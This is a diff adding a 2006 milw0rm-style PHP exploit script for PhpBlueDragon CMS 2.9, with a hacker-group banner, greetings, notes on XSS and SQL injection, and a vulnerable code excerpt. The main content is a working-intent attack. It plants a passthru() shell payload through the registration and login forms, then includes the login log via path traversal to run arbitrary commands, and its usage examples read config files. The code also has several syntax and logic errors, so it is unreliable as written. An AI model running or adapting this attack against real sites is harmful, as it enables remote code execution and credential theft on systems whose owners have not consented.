@@ -1,0 +1,283 @@
+#!/usr/bin/php -q -d short_open_tag=on
+
+<?
+$devilteam = "
+
+:::::::::  :::::::::: :::     ::: ::::::::::: :::        
+:+:    :+: :+:        :+:     :+:     :+:     :+:        
++:+    +:+ +:+        +:+     +:+     +:+     +:+        
++#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
++#+    +#+ +#+         +#+   +#+      +#+     +#+        
+#+#    #+# #+#          #+#+#+#       #+#     #+#        
+#########  ##########     ###     ########### ########## 
+::::::::::: ::::::::::     :::     ::::    ::::  
+    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
+    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
+    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
+    +#+     +#+        +#+     +#+ +#+       +#+ 
+    #+#     #+#        #+#     #+# #+#       #+# 
+    ###     ########## ###     ### ###       ### 
+	
+	
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- PhpBlueDragon CMS <= 2.9 (XSS/SQL) Remote Code Execution Exploit
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- [Script name: PhpBlueDragon CMS v.2.9
+- [Script site: http://phpbluedragon.net/
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-          Find by: Kacper (a.k.a Rahim)
++
+-    DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam
++
+-          Contact: kacper1964@yahoo.pl
+-                        or
+-           http://www.rahim.webd.pl/
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- Special Greetz: DragonHeart ;-)
+- Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus
+-                 SkD, nukedclx, Ramzes
+-
+- Greetz for all users DEVIL TEAM IRC Channel !!
+!@ Przyjazni nie da sie zamienic na marne korzysci @!
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-            Z Dedykacja dla osoby,
+-         bez ktorej nie mogl bym zyc...
+-           K.C:* J.M (a.k.a Magaja)
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
+/*
+XSS:
+http://www.site.pl/?m=[XSS]
+
+http://www.site.pl/?m=%3Ctitle%3EDEVIL%20TEAM%20HACK%20YOU%3C/title%3E
+
+and
+
+http://www.site.pl/?m=[SQL]
+
+because public_includes/pub_kernel/pbd_modules.php on line 89-115:
+....
+class ModuleOptions
+{
+	var $ModConfigTable;
+	var $NoAccessInfo;
+
+	// Pobierz dane konfiguracyjne pluginu
+	function GetModuleConfig($ModuleName)
+	{
+
+		global $DBTablePrefix,$DragonDBKernel;
+
+		$sql = "SELECT * FROM ".$DBTablePrefix."modules WHERE mod_self_name='{$ModuleName}'";
+
+		if(!$DragonDBKernel -> query($sql))
+		{
+		EchoWarning("DE", "Can not exec query",__FILE__,__LINE__,$sql);
+		}
+
+			$Result = $DragonDBKernel -> fetch_array();
+			$Rows = $DragonDBKernel -> fetch_num_array();
+
+		if($Rows != 1)
+		{
+			// B³±d pobierania informacji o module
+			EchoWarning("PE", "Could not get module configuration",__FILE__,__LINE__,$sql);
+		}
+		else
+		{
+...
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+this works against register_globals=On
+
+*/
+print $devilteam;
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path cmd options\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to PhpCommander\r\n";
+echo "cmd:       a shell command\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /lists/ cat ./config/config.php\r\n";
+echo "php ".$argv[0]." localhost /lists/ ls -la -p81\r\n";
+echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
+die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";
+$port=80;
+$proxy="";
+
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$evil= "<?passthru("$cmd");?>"
+$data='
+    -----------------------------ZGV2aWx0ZWFt--
+    Content-Disposition: form-data; name="login";
+    '.$evil.'
+	-----------------------------ZGV2aWx0ZWFt--
+    Content-Disposition: form-data; name="password";
+    weh4cky0u
+	-----------------------------ZGV2aWx0ZWFt--
+    Content-Disposition: form-data; name="password_recom";
+    weh4cky0u
+		-----------------------------ZGV2aWx0ZWFt--
+    Content-Disposition: form-data; name="email";
+    polish@hackers.pl
+    -----------------------------ZGV2aWx0ZWFt--
+    Content-Disposition: form-data; name="send";
+    
+    Stwórz moje konto!
+    -----------------------------ZGV2aWx0ZWFt--
+    ';
+    $packet ="POST ".$p."index.php?m=register HTTP/1.1\r\n";
+    $packet.="User-Agent: Googlebot/2.1\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Accept: text/plain\r\n";
+    $packet.="Content-Type: multipart/form-data; boundary=-----------------------------ZGV2aWx0ZWFt--\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.=$data;
+	$packet.="Connection: Close\r\n";
+    show($packet);
+    sendpacketii($packet);
+	echo "Enter to Evil Bot account"
+	
+	
+$data2='
+    -----------------------------ZGV2aWx0ZWF0t--
+    Content-Disposition: form-data; name="login";
+    '.$evil.'
+	-----------------------------ZGV2aWx0ZWF0t--
+    Content-Disposition: form-data; name="password";
+    weh4cky0u
+    -----------------------------ZGV2aWx0ZWF0t--
+    Content-Disposition: form-data; name="send";
+    
+    Zaloguj mnie!
+    -----------------------------ZGV2aWx0ZWF0t--
+    ';
+$packet ="GET ".$p."index.php?m=login" HTTP/1.0\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+    $packet.="Accept: text/plain\r\n";
+    $packet.="Content-Type: multipart/form-data; boundary=-----------------------------ZGV2aWx0ZWF0t--\r\n";
+    $packet.="Content-Length: ".strlen($data2)."\r\n";
+    $packet.=$data;
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+
+$packet ="GET ".$p."pbd_engine.php?phpExt=../../../system_logs/log_sys/LOG_LOGIN.log&cmd=".$cmd." HTTP/1.0\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"56789"))
+{
+ $temp=explode("56789",$html);
+ echo $temp[1];
+ echo "\r\nExploit work :D\r\n";
+ echo "\r\nDEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n";
+ die;
+}
+}
+?>
+
+# milw0rm.com [2006-09-20]
